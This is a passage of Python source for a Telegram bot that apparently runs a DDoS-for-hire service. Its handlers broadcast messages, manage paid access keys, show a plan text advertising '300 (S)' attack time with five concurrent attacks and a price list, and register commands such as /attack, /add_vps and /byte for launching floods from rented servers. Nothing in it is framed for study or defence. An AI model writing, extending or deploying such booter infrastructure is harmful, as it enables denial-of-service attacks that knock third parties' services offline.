                    await context.bot.send_audio(chat_id=chat_id, audio=file_id, caption=caption, parse_mode="Markdown")
                else:
                    await context.bot.send_audio(chat_id=chat_id, audio=file_id)
            elif media_message.voice:
                file_id = media_message.voice.file_id
                await context.bot.send_voice(chat_id=chat_id, voice=file_id)
            elif media_message.text:
                await context.bot.send_message(chat_id=chat_id, text=media_message.text, parse_mode="Markdown")
            else:
                continue
            success_count += 1
        except Exception as e:
            print(f"❌ Failed to send to {chat_id}: {e}")
            failure_count += 1

    await update.message.reply_text(
        f"✅ *Broadcast Completed!*\n📤 Sent to: {success_count}\n❌ Failed: {failure_count}",
        parse_mode="Markdown"
    )

async def uptime(update: Update, context: CallbackContext):
    now = time.time()
    uptime_seconds = int(now - START_TIME)
    uptime_str = str(timedelta(seconds=uptime_seconds))

    await update.message.reply_text(f"⏱️ *Bot Uptime:* `{uptime_str}`", parse_mode="Markdown")

async def key_status(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return

    keys = KEYS_COLLECTION.find()
    msg = "🔑 *Key Usage Overview:*\n\n"

    for key in keys:
        used = len(key.get("users", []))
        limit = key.get("max_limit", 0)
        remaining = max(0, limit - used)
        msg += f"`{key['key']}` → Used: {used} / {limit} | Remaining: {remaining}\n"

    await update.message.reply_text(msg or "No keys found.", parse_mode="Markdown")

async def show_plan(update: Update, context: CallbackContext):
    user = update.effective_user
    user_name = f"@{user.username}" if user.username else user.first_name

    # Fetch the latest plan text from the database
    plan_data = settings_collection.find_one({"name": "plan"})
    if plan_data and "text" in plan_data:
        plan_text = plan_data["text"]
    else:
        # Default Plan if not updated yet
        plan_text = """Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
💰1 DAYS        :- Admin
💰3 DAYS        :- Admin
💰1 WEEK        :-  Admin 
💰1 MONTH      :- Admin 
💰FULL SEASON  :-  Admin 
"""

    # Final text with username + plan
    final_text = f"{user_name}, {plan_text}"

    await update.message.reply_text(final_text)

async def update_plan(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to update the plan.")
        return

    # Check if admin replied to a message
    if update.message.reply_to_message:
        new_plan_text = update.message.reply_to_message.text
    else:
        # If no reply, take text after command
        if not context.args:
            await update.message.reply_text("⚠️ Usage: Reply to a text message with /update_plan or send /update_plan <new plan text>")
            return
        new_plan_text = " ".join(context.args)

    # Save the new plan into the database
    settings_collection.update_one(
        {"name": "plan"},
        {"$set": {"text": new_plan_text}},
        upsert=True
    )

    await update.message.reply_text("✅ Plan updated successfully!")
                    
    
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("add_vps", add_vps))
    application.add_handler(CommandHandler("vps_status", vps_status))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("upload", upload)) 
    application.add_handler(CommandHandler("setup", setup))
    application.add_handler(CommandHandler("add", add_friend))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("remove_vps", remove_vps))
    application.add_handler(CommandHandler("all_vps", all_vps))
    application.add_handler(CommandHandler("key_reset", key_reset))
    application.add_handler(CommandHandler("post", post)) 
    application.add_handler(CommandHandler("uptime", uptime))      
    application.add_handler(CommandHandler("key_status", key_status))
    application.add_handler(CommandHandler("plan", show_plan))
    application.add_handler(CommandHandler("update_plan", update_plan))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))

    # Start the background task
    loop = asyncio.get_event_loop()
    loop.create_task(remove_expired_users())

    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('key_upload', start_key_upload)],
        states={
            ASK_TYPE: [MessageHandler(filters.TEXT, handle_key_type_text)],
            ASK_SINGLE_KEY: [MessageHandler(filters.TEXT, receive_single_key)],
            ASK_SINGLE_LIMIT: [MessageHandler(filters.TEXT, receive_single_limit)],
            ASK_BULK_FILE: [MessageHandler(filters.Document.ALL, receive_bulk_file)],
            ASK_BULK_LIMIT: [MessageHandler(filters.TEXT, receive_bulk_limit)],
        },
        fallbacks=[],
    )
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("key", get_key))  # ✅ Correctly aligned

    # Run the bot
    application.run_polling()


if __name__ == '__main__':
    main()
    